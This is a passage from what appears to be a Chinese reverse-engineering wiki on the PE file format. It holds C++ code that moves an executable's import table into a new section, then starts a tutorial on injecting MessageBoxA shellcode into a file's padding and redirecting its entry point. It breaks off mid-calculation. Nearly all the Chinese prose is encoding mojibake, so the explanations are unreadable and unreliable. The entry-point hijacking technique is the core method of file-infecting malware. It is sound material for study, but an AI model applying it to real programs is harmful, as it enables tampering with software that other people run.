æŒ‡å‘æ–°å¯¼å…¥è¡¨ï¼Œéå†å®ƒï¼Œå°†æ‰€æœ‰INTè¡¨æ‹·èµ°ï¼›è®°å½•æ–°INTè¡¨çš„RVAï¼Œæ›´æ–°å¯¼å…¥è¡¨ä¸­OriginalFirstThunkæŒ‡å‘ æŒ‡å‘æ–°å¯¼å…¥è¡¨ï¼Œéå†INTè¡¨ å¤„ç†INTè¡¨æŒ‡å‘çš„æç¤ºåè¡¨ï¼›è®°å½•æ–°æç¤ºåè¡¨çš„RVAï¼Œæ›´æ–°INTè¡¨æŒ‡å‘ å¤„ç†å¯¼å…¥è¡¨çš„Nameå­—ç¬¦ä¸²ï¼Œæ‹·èµ°ï¼›è®°å½•Nameæ–°ä½ç½®çš„RVAï¼Œæ›´æ–°å¯¼å…¥è¡¨Nameå­—æ®µæŒ‡å‘ æ›´æ–°æ•°æ®ç›®å½•é¡¹ä¸­å¯¼å…¥è¡¨çš„RVAåœ°å€æŒ‡å‘ å°†lpNewBufferå­˜ç›˜ æ£€éªŒåŠæ³•ï¼š è¿è¡Œä¿®æ”¹åå­˜ç›˜çš„exeï¼Œçœ‹èƒ½å¦æ­£å¸¸è¿è¡Œ ä½¿ç”¨PEå·¥å…·å¯¹æ¯”ä¿®æ”¹å‰åexeçš„å¯¼å…¥è¡¨ä¿¡æ¯ æµ‹è¯•å‡½æ•° å¤§è‡´æµç¨‹123456789101112131415161718192021222324252627282930313233343536//æµ‹è¯•ç§»åŠ¨å¯¼å…¥è¡¨int TestMoveImportTable()&#123; //å†™æ­»çš„ï¼Œæ–¹ä¾¿æµ‹è¯•ç”¨ PEManipulator PEFile(&quot;E:\\\\temp\\\\MoveImportTable\\\\fg.exe&quot;); //æ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; //æ–°å¢èŠ‚ LPVOID lpNewBuffer = PEFile.AddANewSection(0x2000); //æ–°èŠ‚ç›´æ¥0x2000ï¼Œä¹Ÿå¯ä»¥å…ˆç®—ä¸€éï¼ŒæŒ‰éœ€æ–°å¢èŠ‚çš„å¤§å° if (!lpNewBuffer) &#123; return 1; &#125; INVOKE_ON_EXIT([&amp;] &#123; delete[] lpNewBuffer; &#125;); printf(&quot;[+] AddANewSection for m_lpFileBuffer successfully. &quot;); //ç§»åŠ¨å¯¼å‡ºè¡¨åˆ°æ–°èŠ‚ if (!PEFile.MoveImportTableToNewSection(lpNewBuffer)) &#123; return 1; &#125; printf(&quot;[+] MoveImportTableToNewSection successfully. &quot;); //å­˜ç›˜ if (!PEFile.SaveUnstretchedPEToDisk(lpNewBuffer, &quot;ImportTableRemoved&quot;)) &#123; return 1; &#125; printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); return 0;&#125; å…·ä½“å®ç° 1BOOL PEManipulator::MoveImportTableToNewSection(LPVOID lpNewBuffer) è·å–ç›¸å…³PEæŒ‡é’ˆï¼Œå’Œå¯¼å…¥è¡¨æŒ‡é’ˆ 123456789101112131415//è·å–NewBufferä¸­ç›¸å…³çš„PEæŒ‡é’ˆauto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer);auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer);auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer);if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE;&#125;// è·å–å¯¼å…¥è¡¨æŒ‡é’ˆauto pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_IMPORT, lpNewBuffer);if (!pImportDirectory)&#123; return FALSE;&#125; æŒ‡å‘æ–°èŠ‚èµ·å§‹ä½ç½®ï¼Œå‡†å¤‡ç§»åŠ¨æ•°æ® 123// æ–°èŠ‚çš„èµ·å§‹ä½ç½®PIMAGE_SECTION_HEADER pNewSection = &amp;pSecHdr_NewBuffer[pPeHdr_NewBuffer-&gt;NumberOfSections - 1];DWORD dwDstOffset = pNewSection-&gt;PointerToRawData; dwDstOffsetè¿™ä¸ªå€¼æ˜¯æ–°èŠ‚.PointerToRawDataï¼Œåœ¨åé¢æ‹·è´å®ŒæŸå—æ•°æ®åä¼šè¿›è¡Œæ›´æ–°ã€‚ dwDstOffsetè¿™ä¸ªå€¼æ˜¯FOAï¼ˆç›¸å¯¹äºæ–‡ä»¶å¤´çš„åç§»ï¼‰ï¼Œå› ä¸ºæˆ‘ä»¬éƒ½æ˜¯åœ¨æœªæ‹‰ä¼¸çš„Bufferä¸Šæ“ä½œã€‚è€Œå¯¼å‡ºè¡¨ä¸­å­˜çš„å­—æ®µéƒ½æ˜¯RVAåœ°å€ï¼Œæ‰€ä»¥è¦ç”¨åˆ°FOAToRVA ç§»åŠ¨å…¨éƒ¨å¯¼å…¥è¡¨ 12345678910111213141516//1ã€ç»Ÿè®¡å¯¼å…¥è¡¨ä¸ªæ•°ï¼Œéšåå°†å¯¼å…¥è¡¨ç§»åŠ¨åˆ°æ–°ä½ç½®BYTE ImportTableCount = 0;while (pImportDirectory[ImportTableCount].OriginalFirstThunk &amp;&amp; pImportDirectory[ImportTableCount].FirstThunk)&#123; ++ImportTableCount;&#125;DWORD ImportTableSize = (ImportTableCount + 1) * sizeof(IMAGE_IMPORT_DESCRIPTOR); // +1 for null terminatormemcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pImportDirectory, ImportTableSize); DWORD dwNewImportTableFOA = dwDstOffset;DWORD dwNewImportTableRVA = 0;if (!FOAToRVA(dwNewImportTableFOA, dwNewImportTableRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += ImportTableSize; //æ›´æ–°dwDstOffset æŒ‡å‘æ–°å¯¼å…¥è¡¨ï¼Œç§»åŠ¨æ¯å¼ å¯¼å…¥è¡¨ä¸‹çš„INTè¡¨ 1234567891011121314151617181920212223242526272829303132//2ã€æŒ‡å‘æ–°æ–°å¯¼å…¥è¡¨ï¼Œéå†å®ƒï¼Œå°†æ‰€æœ‰INTè¡¨æ‹·åˆ°æ–°ä½ç½®auto pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA);while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk)&#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); BYTE count = 0; while (pINTTable[count]) &#123; ++count; &#125; DWORD dwINTTableSize = (count + 1) * sizeof(DWORD); // +1 for null terminator memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pINTTable, dwINTTableSize); DWORD dwNewINTTableFOA = dwDstOffset; DWORD dwNewINTTableRVA = 0; if (!FOAToRVA(dwNewINTTableFOA, dwNewINTTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += dwINTTableSize; //æ›´æ–°dwDstOffset //ä¿®æ­£å¯¼å…¥è¡¨ä¸­OriginalFirstThunkæŒ‡å‘ pNewImportDirectory-&gt;OriginalFirstThunk = dwNewINTTableRVA; ++pNewImportDirectory; //ä¸‹ä¸€å¼ å¯¼å…¥è¡¨&#125; æŒ‡å‘æ–°å¯¼å…¥è¡¨ï¼Œéå†INTè¡¨ï¼Œå¤„ç†æç¤ºåè¡¨ï¼›å¤„ç†å¯¼å…¥è¡¨Nameå­—æ®µ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//3ã€éå†æ–°å¯¼å…¥è¡¨ï¼Œéå†INTè¡¨ï¼Œå¤„ç†æç¤ºåè¡¨ + å¤„ç†å¯¼å…¥è¡¨çš„Nameå­—æ®µpNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA); //å›åˆ°ç¬¬ä¸€å¼ å¯¼å…¥è¡¨while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk)&#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA, lpNewBuffer)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); while (*pINTTable) &#123; if (IMAGE_SNAP_BY_ORDINAL(*pINTTable)) //æœ€é«˜ä½ä¸º1ï¼Œåºå·æ–¹å¼è¾“å…¥ &#123; ; &#125; else //æœ€é«˜ä½ä¸º0ï¼ŒæŒ‡å‘Hint-Name Table &#123; DWORD dwHintNameTableFOA = 0; if (!RVAToFOA(*pINTTable, dwHintNameTableFOA)) &#123; return FALSE; &#125; auto pHintNameTable = (PIMAGE_IMPORT_BY_NAME)((DWORD)lpNewBuffer + dwHintNameTableFOA); BYTE SizeOfHintNameTableItem = sizeof(pHintNameTable-&gt;Hint) + (strlen((PCHAR)pHintNameTable-&gt;Name) + 1); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), (PBYTE)pHintNameTable, SizeOfHintNameTableItem); DWORD dwNewHintNameTableFOA = dwDstOffset; DWORD dwNewHintNameTableRVA = 0; if (!FOAToRVA(dwNewHintNameTableFOA, dwNewHintNameTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += SizeOfHintNameTableItem; //ä¿®æ­£INTè¡¨é¡¹çš„æŒ‡å‘ *pINTTable = dwNewHintNameTableRVA; &#125; ++pINTTable; //INTè¡¨ä¸‹ä¸€é¡¹ &#125; //å¤„ç†å¯¼å…¥è¡¨çš„Nameå­—æ®µ DWORD dwNameFOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;Name, dwNameFOA)) &#123; return FALSE; &#125; auto cName = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), cName, strlen(cName) + 1); DWORD dwNewNameFOA = dwDstOffset; DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += strlen(cName) + 1; //æ›´æ–°dwDstOffset pNewImportDirectory-&gt;Name = dwNewNameRVA; //ä¿®æ­£å¯¼å…¥è¡¨ä¸­Nameå­—æ®µæŒ‡å‘ //ä¸‹ä¸€å¼ å¯¼å…¥è¡¨ ++pNewImportDirectory; &#125; æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­çš„å¯¼å…¥è¡¨åœ°å€æŒ‡å‘ 12//4ã€æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­çš„å¯¼å…¥è¡¨åœ°å€æŒ‡å‘pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = dwNewImportTableRVA; å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146BOOL PEManipulator::MoveImportTableToNewSection(LPVOID lpNewBuffer)&#123; //è·å–NewBufferä¸­ç›¸å…³çš„PEæŒ‡é’ˆ auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer); auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer); if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE; &#125; // è·å–å¯¼å…¥è¡¨æŒ‡é’ˆ auto pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_IMPORT, lpNewBuffer); if (!pImportDirectory) &#123; return FALSE; &#125; // æ–°èŠ‚çš„èµ·å§‹ä½ç½® PIMAGE_SECTION_HEADER pNewSection = &amp;pSecHdr_NewBuffer[pPeHdr_NewBuffer-&gt;NumberOfSections - 1]; DWORD dwDstOffset = pNewSection-&gt;PointerToRawData; //1ã€ç»Ÿè®¡å¯¼å…¥è¡¨ä¸ªæ•°ï¼Œéšåå°†å¯¼å…¥è¡¨ç§»åŠ¨åˆ°æ–°ä½ç½® BYTE ImportTableCount = 0; while (pImportDirectory[ImportTableCount].OriginalFirstThunk &amp;&amp; pImportDirectory[ImportTableCount].FirstThunk) &#123; ++ImportTableCount; &#125; DWORD ImportTableSize = (ImportTableCount + 1) * sizeof(IMAGE_IMPORT_DESCRIPTOR); // +1 for null terminator memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pImportDirectory, ImportTableSize); DWORD dwNewImportTableFOA = dwDstOffset; DWORD dwNewImportTableRVA = 0; if (!FOAToRVA(dwNewImportTableFOA, dwNewImportTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += ImportTableSize; //æ›´æ–°dwDstOffset //2ã€æŒ‡å‘æ–°æ–°å¯¼å…¥è¡¨ï¼Œéå†å®ƒï¼Œå°†æ‰€æœ‰INTè¡¨æ‹·åˆ°æ–°ä½ç½® auto pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA); while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk) &#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); BYTE count = 0; while (pINTTable[count]) &#123; ++count; &#125; DWORD dwINTTableSize = (count + 1) * sizeof(DWORD); // +1 for null terminator memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pINTTable, dwINTTableSize); DWORD dwNewINTTableFOA = dwDstOffset; DWORD dwNewINTTableRVA = 0; if (!FOAToRVA(dwNewINTTableFOA, dwNewINTTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += dwINTTableSize; //æ›´æ–°dwDstOffset //ä¿®æ­£å¯¼å…¥è¡¨ä¸­OriginalFirstThunkæŒ‡å‘ pNewImportDirectory-&gt;OriginalFirstThunk = dwNewINTTableRVA; ++pNewImportDirectory; //ä¸‹ä¸€å¼ å¯¼å…¥è¡¨ &#125; //3ã€éå†æ–°å¯¼å…¥è¡¨ï¼Œéå†INTè¡¨ï¼Œå¤„ç†æç¤ºåè¡¨ + å¤„ç†å¯¼å…¥è¡¨çš„Nameå­—æ®µ pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA); //å›åˆ°ç¬¬ä¸€å¼ å¯¼å…¥è¡¨ while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk) &#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA, lpNewBuffer)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); while (*pINTTable) &#123; if (IMAGE_SNAP_BY_ORDINAL(*pINTTable)) //æœ€é«˜ä½ä¸º1ï¼Œåºå·æ–¹å¼è¾“å…¥ &#123; ; &#125; else //æœ€é«˜ä½ä¸º0ï¼ŒæŒ‡å‘Hint-Name Table &#123; DWORD dwHintNameTableFOA = 0; if (!RVAToFOA(*pINTTable, dwHintNameTableFOA)) &#123; return FALSE; &#125; auto pHintNameTable = (PIMAGE_IMPORT_BY_NAME)((DWORD)lpNewBuffer + dwHintNameTableFOA); BYTE SizeOfHintNameTableItem = sizeof(pHintNameTable-&gt;Hint) + (strlen((PCHAR)pHintNameTable-&gt;Name) + 1); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), (PBYTE)pHintNameTable, SizeOfHintNameTableItem); DWORD dwNewHintNameTableFOA = dwDstOffset; DWORD dwNewHintNameTableRVA = 0; if (!FOAToRVA(dwNewHintNameTableFOA, dwNewHintNameTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += SizeOfHintNameTableItem; //ä¿®æ­£INTè¡¨é¡¹çš„æŒ‡å‘ *pINTTable = dwNewHintNameTableRVA; &#125; ++pINTTable; //INTè¡¨ä¸‹ä¸€é¡¹ &#125; //å¤„ç†å¯¼å…¥è¡¨çš„Nameå­—æ®µ DWORD dwNameFOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;Name, dwNameFOA)) &#123; return FALSE; &#125; auto cName = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), cName, strlen(cName) + 1); DWORD dwNewNameFOA = dwDstOffset; DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += strlen(cName) + 1; //æ›´æ–°dwDstOffset pNewImportDirectory-&gt;Name = dwNewNameRVA; //ä¿®æ­£å¯¼å…¥è¡¨ä¸­Nameå­—æ®µæŒ‡å‘ //ä¸‹ä¸€å¼ å¯¼å…¥è¡¨ ++pNewImportDirectory; &#125; //4ã€æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­çš„å¯¼å…¥è¡¨åœ°å€æŒ‡å‘ pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = dwNewImportTableRVA; printf(&quot;[+] Import table successfully moved and fixed. &quot;); return TRUE;&#125; è¿è¡Œç»“æœ è¿è¡Œä¿®æ”¹åçš„exeï¼Œæ­£å¸¸è¿è¡Œ PE Toolså¯¹æ¯”ä¸¤ä¸ªexeçš„å¯¼å…¥è¡¨"},{"title":"ç©ºç™½åŒºæ·»åŠ ä»£ç ","path":"/wiki/PE/ç©ºç™½åŒºæ·»åŠ ä»£ç .html","content":"ç©ºç™½åŒºï¼šDOSéƒ¨åˆ†+PEå¤´+èŠ‚è¡¨ä¸ç¬¬ä¸€ä¸ªèŠ‚æ•°æ®ä¹‹é—´çš„paddingåŒºåŸŸã€èŠ‚æ•°æ®ä¸èŠ‚æ•°æ®ä¹‹é—´çš„paddingåŒºåŸŸ æ­¥éª¤ï¼š å‡†å¤‡è¦æ·»åŠ çš„ä»£ç  æ³¨æ„è¦æ·»åŠ çš„ä»£ç ä¸­çš„call/jmpæŒ‡ä»¤åé¢è·Ÿçš„æ˜¯åç§»åœ°å€ï¼Œè¦æ·»åŠ åå†è®¡ç®— æ‰§è¡Œå®Œæ·»åŠ çš„ä»£ç åå›åˆ°ç¨‹åºåŸæœ¬çš„OEPæ‰§è¡Œ åœ¨PEçš„ç©ºç™½åŒºå¡«å†™æ„é€ çš„è¿™æ®µä»£ç  ä¿®æ”¹PEæ–‡ä»¶çš„AddressOfEntryPointä¸ºæ„é€ çš„ä»£ç  æ•ˆæœï¼šè¿è¡Œç¨‹åºï¼Œç¨‹åºå…ˆæ‰§è¡Œæ„é€ çš„ä»£ç -&gt;ç¨‹åºåŸæœ¬çš„OEP ä¸‹é¢ä»¥æ·»åŠ Messageboxä»£ç ä¸ºä¾‹ï¼Œæ¥å±•ç¤ºè¿™ä¸ªè¿‡ç¨‹ çŸ¥è¯†è¡¥å…… è·å–ç³»ç»ŸAPIçš„åœ°å€ æ³¨ï¼šç³»ç»ŸAPIåœ°å€é‡å¯ç”µè„‘ååœ°å€ä¼šå˜ æ–¹å¼ä¸€ï¼šODåœ¨user32.dllä¸­æŸ¥æ‰¾MessageBoxAå‡½æ•°åœ°å€æ–¹å¼äºŒï¼šIDEè°ƒè¯•æ­¥è¿›MessageBoxAéšæ„æ‹–è¿›ä¸€ä¸ªexeï¼Œç‚¹å‡»ä¸Šæ–¹çš„EæŒ‰é’®ï¼ŒæŸ¥çœ‹æ‰€æœ‰çš„æ¨¡å—ã€‚åŒå‡»USER32.dllé‚£è¡Œï¼ŒæŒ‰Ctrl+Nï¼Œæ‰¾MessageBoxA 1234567#include &lt;Windows.h&gt;int main()&#123;\tMessageBoxA(0, 0, 0, 0);\treturn 0;&#125; callå’ŒjmpæŒ‡ä»¤ååç§»åœ°å€çš„è®¡ç®— callå’ŒjmpæŒ‡ä»¤åè·Ÿçš„æ˜¯åˆ°ç›®çš„åœ°å€çš„ç›¸å¯¹ä½ç§»ï¼ˆåç§»å€¼ï¼‰ï¼Œè€Œä¸æ˜¯ç›®æ ‡åœ°å€ï¼ˆç»å¯¹åœ°å€ï¼‰ã€‚ ä»¥callæŒ‡ä»¤ï¼ˆç¡¬ç¼–ç E8ï¼‰ä¸ºä¾‹æ¥è®²åç§»åœ°å€æ€ä¹ˆç®—ï¼š å…¬å¼ï¼š åç§»å€¼=è¦è·³è½¬çš„ç›®çš„åœ°å€âˆ’(å½“å‰callæŒ‡ä»¤åœ°å€+å½“å‰callæŒ‡ä»¤é•¿åº¦)åç§»å€¼=è¦è·³è½¬çš„ç›®çš„åœ°å€âˆ’(å½“å‰callæŒ‡ä»¤åœ°å€+å½“å‰callæŒ‡ä»¤é•¿åº¦) åç§»å€¼=è¦è·³è½¬çš„ç›®çš„åœ°å€âˆ’(å½“å‰callæŒ‡ä»¤åœ°å€+å½“å‰callæŒ‡ä»¤é•¿åº¦) å¦‚æœå½“å‰callæŒ‡ä»¤é•¿åº¦æ˜¯5ä¸ªå­—èŠ‚ åç§»å€¼=è¦è·³è½¬çš„ç›®çš„åœ°å€âˆ’(å½“å‰callæŒ‡ä»¤åœ°å€+5)åç§»å€¼=è¦è·³è½¬çš„ç›®çš„åœ°å€âˆ’(å½“å‰callæŒ‡ä»¤åœ°å€+5) åç§»å€¼=è¦è·³è½¬çš„ç›®çš„åœ°å€âˆ’(å½“å‰callæŒ‡ä»¤åœ°å€+5) å…¬å¼æ¨å¯¼è¿‡ç¨‹è¦è·³è½¬çš„ç›®çš„åœ°å€=callæŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€+åç§»å€¼...â‘ è¦è·³è½¬çš„ç›®çš„åœ°å€=callæŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€+åç§»å€¼...â‘ è¦è·³è½¬çš„ç›®çš„åœ°å€=callæŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€+åç§»å€¼...â‘ æ¥ç€ï¼Œå› ä¸ºcallæŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ç­‰äºå½“å‰callæŒ‡ä»¤åœ°å€åŠ ä¸Šå½“å‰callæŒ‡ä»¤çš„é•¿åº¦ï¼ˆEIPä¹Ÿæ˜¯é€šè¿‡è¿™ç§æ–¹å¼æ¥æ›´æ–°çš„ï¼‰ï¼Œå°†è¿™ä¸ªå…³ç³»ä»£å…¥ä¸Šé¢çš„å…¬å¼ä¸­ï¼Œå¾—åˆ°ï¼šè¦è·³è½¬çš„ç›®çš„åœ°å€=(å½“å‰callæŒ‡ä»¤åœ°å€+å½“å‰callæŒ‡ä»¤é•¿åº¦)+åç§»å€¼...â‘¡è¦è·³è½¬çš„ç›®çš„åœ°å€=(å½“å‰callæŒ‡ä»¤åœ°å€+å½“å‰callæŒ‡ä»¤é•¿åº¦)+åç§»å€¼...â‘¡è¦è·³è½¬çš„ç›®çš„åœ°å€=(å½“å‰callæŒ‡ä»¤åœ°å€+å½“å‰callæŒ‡ä»¤é•¿åº¦)+åç§»å€¼...â‘¡å¯¹å¼å­â‘¡å˜å½¢ï¼Œå°±å¾—åˆ°ä¸Šé¢çš„å…¬å¼EIPæ›´æ–°ä¹Ÿæ˜¯é€šè¿‡å½“å‰æŒ‡ä»¤åœ°å€+å½“å‰æŒ‡ä»¤é•¿åº¦æ¥æ›´æ–°çš„åœ¨è®¡ç»„çš„çŸ¥è¯†ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“CPUæ ¹æ®EIPå–æŒ‡æ‰§è¡Œï¼Œå–æŒ‡æ‰§è¡Œï¼ŒEIPå°±æ˜¯é€šè¿‡å½“å‰æŒ‡ä»¤åœ°å€+å½“å‰æŒ‡ä»¤é•¿åº¦ï¼Œè‡ªåŠ¨æ›´æ–°ä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚ call/jmpæŒ‡ä»¤åä¸ºä»€ä¹ˆè·Ÿçš„æ˜¯ç›¸å¯¹åœ°å€ç­”ï¼šç”¨ç›¸å¯¹å€¼çš„è¯ï¼Œæ–¹ä¾¿ç¨‹åºåœ¨å†…å­˜ä¸­çš„æµ®åŠ¨è£…é…ã€‚è¯¦è§ã€Šæ±‡ç¼–è¯­è¨€4th-ç‹çˆ½ã€‹å¦å¤–ï¼Œåç§»å€¼=è¦è·³è½¬çš„ç›®æ ‡åœ°å€-ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€è®¡ç®—å‡ºæ¥çš„æ•°æ˜¯ä¸ªè¡¥ç ï¼Œç”¨æœ‰ç¬¦å·æ•°æ¥çœ‹å¾…ï¼šå¦‚æœæ˜¯æ­£æ•°ï¼Œè¡¨ç¤ºè¦è·³è½¬çš„ç›®æ ‡åœ°å€åœ¨ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ä¸‹é¢ï¼Œä¹Ÿå°±æ˜¯è¯´è¦è·³è½¬çš„ç›®æ ‡åœ°å€ï¼ˆé«˜åœ°å€ï¼‰-ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼ˆä½åœ°å€ï¼‰å¦‚æœæ˜¯è´Ÿæ•°ï¼Œè¡¨ç¤ºè¦è·³è½¬çš„ç›®æ ‡åœ°å€åœ¨ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ä¸Šé¢ï¼Œä¹Ÿå°±æ˜¯è¯´è¦è·³è½¬çš„ç›®æ ‡åœ°å€ï¼ˆä½åœ°å€ï¼‰-ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼ˆé«˜åœ°å€ï¼‰ è®¡ç®—åç§»çš„ç»†èŠ‚ ä¸Šé¢è¯´äº†è®¡ç®—call/jmpæŒ‡ä»¤åç§»å€¼çš„å…¬å¼æ˜¯ï¼š åç§»å€¼=è¦è·³è½¬çš„ç›®çš„åœ°å€âˆ’(å½“å‰callæŒ‡ä»¤åœ°å€+5)åç§»å€¼=è¦è·³è½¬çš„ç›®çš„åœ°å€âˆ’(å½“å‰callæŒ‡ä»¤åœ°å€+5) åç§»å€¼=è¦è·³è½¬çš„ç›®çš„åœ°å€âˆ’(å½“å‰callæŒ‡ä»¤åœ°å€+5) ä½†è¦æ³¨æ„PEæ–‡ä»¶åˆ†æ–‡ä»¶çŠ¶æ€å’Œå†…å­˜çŠ¶æ€ï¼Œæˆ‘ä»¬è¯´çš„æŒ‡ä»¤åœ°å€æ˜¯æŒ‡å†…å­˜è¿è¡Œæ—¶çš„çŠ¶æ€ï¼ˆè¦åŠ ImageBaseï¼‰ã€‚ æ‰‹åŠ¨å®ç° ç›®æ ‡PEåŠç›¸å…³å­—æ®µï¼šipmsg.exe å­—æ®µ å€¼ FileAlignment 1000h SectionAlignment 1000h ImageBase 400000h AddressOfEntryPoint 183D7h æ„é€ è¦å†™å…¥çš„ä»£ç ä¸ºMessageBoxA(0, 0, 0, 0) 1234567#include &lt;Windows.h&gt;int main()&#123;\tMessageBoxA(0, 0, 0, 0);\treturn 0;&#125; è¿™ä¸ªå‡½æ•°æœ¬è´¨å°±æ˜¯ä¸€æ®µç¡¬ç¼–ç  123456789101112131415\t0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x00, 0x00, 0x00, 0x00\t/*\tpush 0\tpush 0\tpush 0\tpush 0\tcall 00000000 åç§»åœ°å€å¾…ç®—\tjmp 00000000 åç§»åœ°å€å¾…ç®—*/ è·å–MessageBoxAçš„åœ°å€ï¼ˆåœ¨è¿™æ¬¡å®éªŒä¸­çš„åœ°å€æ˜¯771B0D80ï¼‰ã€‚ æ³¨ï¼šç³»ç»ŸAPIåœ°å€é‡å¯ç”µè„‘åä¼šå˜ï¼›æ­¤åœ°å€ä»…å¯¹äºç¬”è€…çš„ç”µè„‘ç¯å¢ƒæœ‰æ•ˆã€‚ callæŒ‡ä»¤åçš„åç§»è®¡ç®— è¿™æ¬¡çš„å®éªŒä¸ç”¨å¯¼å…¥è¡¨çš„é—´æ¥callï¼ˆç¡¬ç¼–ç FFï¼‰ï¼Œè€Œæ˜¯ç”¨ç›´æ¥callï¼ˆç¡¬ç¼–ç E8ï¼‰ã€‚ å‡è®¾æˆ‘ä»¬å°†è¿™æ®µä»£ç ä»ipmsg.exeç¨‹åºçš„1A730håœ°å€å¼€å§‹å†™ï¼š E8æŒ‡ä»¤åœ°å€ä¸ºï¼š1A738h æ ¹æ®å…¬å¼ï¼šåç§»å€¼=è¦è·³è½¬çš„ç›®çš„åœ°å€âˆ’(å½“å‰callæŒ‡ä»¤åœ°å€+5) åç§»å€¼ =MessageBoxAå‡½æ•°çš„åœ°å€ - 